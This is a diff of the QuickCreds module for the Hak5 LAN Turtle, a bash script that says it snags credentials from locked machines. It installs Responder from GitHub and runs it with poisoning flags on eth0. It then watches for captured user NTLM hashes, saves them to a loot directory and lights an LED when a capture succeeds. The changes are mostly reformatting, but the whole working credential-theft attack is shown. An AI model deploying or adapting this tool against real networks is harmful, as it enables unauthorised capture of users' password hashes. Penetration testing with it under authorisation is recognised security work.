@@ -3,7 +3,7 @@ VERSION="1.4"
 DESCRIPTION="Snagging creds from locked machines --Mubix, Room362.com. Implements responder attack and saves creds to numbered directories in /root/loot. LED will blink while QuickCreds is running. Upon capture of NTLM hash the LED will light solid. Author: Hak5Darren. Credit: Mubix."
 CONF=/tmp/QuickCreds.form
 
-# All "dialog" functionality is related to the Turtle "GUI"
+# All "dialog" functionality is related to the Turtle shell
 : ${DIALOG_OK=0}
 : ${DIALOG_CANCEL=1}
 : ${DIALOG_HELP=2}
@@ -11,7 +11,6 @@ CONF=/tmp/QuickCreds.form
 : ${DIALOG_ITEM_HELP=4}
 : ${DIALOG_ESC=255}
 
-# Declare some additional variables
 LOOTDIR="/root/loot/quickcreds/"
 RESPLOG=$LOOTDIR"responder.log"
 RESPROOT="/sd"
@@ -20,22 +19,17 @@ RESPURL="https://github.com/lgandx/Responder/archive/master.zip"
 RESPLOGDIR=$RESPROOT/"Responder/logs"
 SLEEPTIMER="1"
 
-# Function called from the Turtle module "GUI" to configure/setup quickcreds
 function configure {
     # If SD card is mounted continue if not fail due to not enough space.
     if grep -qs $RESPROOT /proc/mounts; then
-            /bin/echo "SD card is mounted."
-     else
-          /usr/bin/dialog --title "QuickCreds" --msgbox "A SD card is not mounted on your turtle, if possible insert and mount a SD card. \n\
-              If that's not possible this program can't function properly." 9 72
-          exit 1
+        /bin/echo "SD card is mounted."
+    else
+        /usr/bin/dialog --title "QuickCreds" --msgbox "An SD card is required to install this module." 9 72
+        exit 1
     fi
 
-
     # Ask if the user really wants to install the module and its dependencies
-    /usr/bin/dialog --title "QuickCreds" \
-    --yesno "\nInstall dependencies and configure QuickCreds?\n\
-    An Internet connection is required for installation.\n" 8 60
+    /usr/bin/dialog --title "QuickCreds" --yesno "\nInstall dependencies and configure QuickCreds?\nAn Internet connection is required for installation.\n" 8 60
     response=$?
     case $response in
         0) ;;
@@ -45,8 +39,7 @@ function configure {
 
     # Check to see if QuickCreds has already been configured
     if [[ -d "$LOOTDIR" || -s "$RESPLOG" ]]; then
-        /usr/bin/dialog --title "QuickCreds" --msgbox "\nThe QuickCreds module is already configured.\n\
-    Creds are saved to $LOOTDIR.\nEnable this module to attack on boot." 9 72
+        /usr/bin/dialog --title "QuickCreds" --msgbox "\nThe QuickCreds module is already configured.\nCreds are saved to $LOOTDIR.\nEnable this module to attack on boot." 9 72
         exit 1
     fi
 
@@ -54,13 +47,12 @@ function configure {
     /bin/ping -q -w 5 -c 1 www.google.com &> /dev/null && {
         :
     } || {
-        /usr/bin/dialog --title "QuickCreds" --msgbox "\n\
-    The LAN Turtle is currently offline.\nPlease connect the LAN Turtle to the Internet and try again. " 9 72
+        /usr/bin/dialog --title "QuickCreds" --msgbox "\nThe LAN Turtle is currently offline.\nPlease connect the LAN Turtle to the Internet and try again." 9 72
         exit 1
     }
 
     # Install dependencies
-    /bin/opkg update | /usr/bin/dialog --progressbox "Updating opkg" 14 72 
+    /bin/opkg update | /usr/bin/dialog --progressbox "Updating opkg" 14 72
 
     if [[ ! $(/bin/opkg list-installed | /bin/grep python-sqlite3) ]]; then
         /bin/opkg install python-sqlite3 | /usr/bin/dialog --progressbox "Installing dependency python-sqlite3" 14 72
@@ -77,7 +69,7 @@ function configure {
     if [[ ! $(/bin/opkg list-installed | /bin/grep coreutils-sleep) ]]; then
         /bin/opkg install coreutils-sleep | /usr/bin/dialog --progressbox "Installing dependency coreutils-sleep" 14 72
     fi
-    
+
     if [[ ! $(/bin/opkg list-installed | /bin/grep unzip) ]]; then
         /bin/opkg install unzip | /usr/bin/dialog --progressbox "Installing dependency unzip" 14 72
     fi
@@ -88,7 +80,7 @@ function configure {
         /bin/rm -rf "$RESPROOT"Responder/
         /bin/rm -rf "$RESPTEMPDL"master.zip*
         # Create new
-        /bin/mkdir -p "$RESPTEMPDL"            
+        /bin/mkdir -p "$RESPTEMPDL"
         # Download and extract
         /usr/bin/wget --progress=dot "$RESPURL" -P "$RESPTEMPDL" 2>&1 | /usr/bin/dialog --progressbox "Download dependency responder" 14 72
         # Unpack the GitHub download
@@ -102,27 +94,23 @@ function configure {
     # Setup loot directory and complete setup
     /bin/mkdir -p "$LOOTDIR"
 
-    /usr/bin/dialog --title "QuickCreds" --msgbox "\n\
-    Configuration complete. Creds will be saved to $LOOTDIR\n\
-    Enable this module to have it start the attack on boot.\n" 9 72
+    /usr/bin/dialog --title "QuickCreds" --msgbox "\nConfiguration complete. Creds will be saved to $LOOTDIR\nEnable this module to have it start the attack on boot.\n" 9 72
 }
 
-# Function called from within this script file, therefore it needs to be positioned before the code that calls the function (bash basics...)
 function finished {
-    /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1  
-    /bin/sync 
+    /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
+    /bin/sync
     exit
 }
 
-# Function called from the Turtle module "GUI"
 function start {
     # Stop on-off-on DHCP blink pattern script, this is what causes the "Terminated" text to appear if running QuickCreds from within the Turtle module system in the Turtle "GUI"
     /bin/echo "Stopping DHCP Detect Blink Script"
     /etc/init.d/dhcp_detect stop
     /bin/echo ""
     /bin/echo "QuickCreds started."
-    /bin/echo "The orange/amber LED will blink while QuickCreds is running."
-    /bin/echo "The orange/amber LED will turn solid upon NTLM hash capture."
+    /bin/echo "The orange LED will blink while QuickCreds is running."
+    /bin/echo "The orange LED will turn solid upon NTLM hash capture."
     /bin/echo ""
     /bin/echo "If starting this module from the Turtle Shell menu,"
     /bin/echo "press CTRL+C to return."
@@ -137,7 +125,7 @@ function start {
     # Delete all current Responder logs
     /bin/rm -rf $RESPLOGDIR
     /bin/ln -s $LOOTDIR"Creds"$((dircount)) $RESPLOGDIR
-        
+
     # Saving interface info, surplus information and can be deleted
     /sbin/ifconfig > $LOOTDIR"Creds"$((dircount))/ifconfig_dump.log
 
@@ -150,37 +138,34 @@ function start {
     # Execute attack
     /bin/echo "Creds$((dircount)) - Starting screen and Responder" >> $RESPLOG
     /usr/sbin/screen -dmS responder /bin/bash -c 'cd /sd/Responder; /usr/bin/python /sd/Responder/Responder.py -I eth0 -w -r -d -P'
-        
+
     /bin/echo "Creds$((dircount)) - LED blink pattern during attack enabled" >> $RESPLOG
     # Blink upon hash capture
     while true; do
-    # Grep for user creds and do not match on machine creds, machine usernames end in $
-    if [[ $(/bin/grep -v '\$:' $RESPLOGDIR/*NTLM* 2>/dev/null) ]]; then
-        /bin/echo "Creds$((dircount)) - Found user creds NTLM file in the logs directory!" >> $RESPLOG
-        /bin/echo "Creds$((dircount)) - Creds obtained and saved" >> $RESPLOG
-        #Copy all responder logs to loot directory
-        /bin/echo "Creds$((dircount)) - Copying the Responder native logs to loot directory" >> $RESPLOG
-        # !!! CHECK THIS! ISN'T THIS "OVERKILL", THERE'S ALREADY A SYMBOLIC LINK ESTABLISHED BETWEEN THESES DIRS! FILES SHOULD ALREADY BE THERE!!!
-        /bin/cp $RESPLOGDIR/* $LOOTDIR"Creds"$((dircount))
-        /bin/echo "Creds$((dircount)) - Calling the finished function" >> $RESPLOG
-        # Call "finished" function
-        finished
-    fi
-    /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
-    /bin/sleep $SLEEPTIMER
-    /bin/echo 0 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
-    /bin/sleep $SLEEPTIMER 
+        # Grep for user creds and do not match on machine creds, machine usernames end in $
+        if [[ $(/bin/grep -v '\$:' $RESPLOGDIR/*NTLM* 2>/dev/null) ]]; then
+            /bin/echo "Creds$((dircount)) - Found user creds NTLM file in the logs directory!" >> $RESPLOG
+            /bin/echo "Creds$((dircount)) - Creds obtained and saved" >> $RESPLOG
+            #Copy all responder logs to loot directory
+            /bin/echo "Creds$((dircount)) - Copying the Responder native logs to loot directory" >> $RESPLOG
+            # !!! CHECK THIS! ISN'T THIS "OVERKILL", THERE'S ALREADY A SYMBOLIC LINK ESTABLISHED BETWEEN THESES DIRS! FILES SHOULD ALREADY BE THERE!!!
+            /bin/cp $RESPLOGDIR/* $LOOTDIR"Creds"$((dircount))
+            /bin/echo "Creds$((dircount)) - Calling the finished function" >> $RESPLOG
+            finished
+        fi
+        /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
+        /bin/sleep $SLEEPTIMER
+        /bin/echo 0 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
+        /bin/sleep $SLEEPTIMER
     done
 }
 
-# Function called from the Turtle module "GUI"
 function stop {
-        /bin/kill $(/bin/ps | /bin/grep [R]esponder | /usr/bin/awk {'print $1'})
-        /etc/init.d/dnsmasq start 1&> /dev/null
-        /bin/echo "QuickCreds Stopped"
+    /bin/kill $(/bin/ps | /bin/grep [R]esponder | /usr/bin/awk {'print $1'})
+    /etc/init.d/dnsmasq start 1&> /dev/null
+    /bin/echo "QuickCreds Stopped"
 }
 
-# Function called from the Turtle module "GUI"
 function status {
-        if [[ $(/bin/ps | /bin/grep -w [R]esponder.py) ]]; then /bin/echo "1"; else /bin/echo "0"; fi
+    if [[ $(/bin/ps | /bin/grep -w [R]esponder.py) ]]; then /bin/echo "1"; else /bin/echo "0"; fi
 }
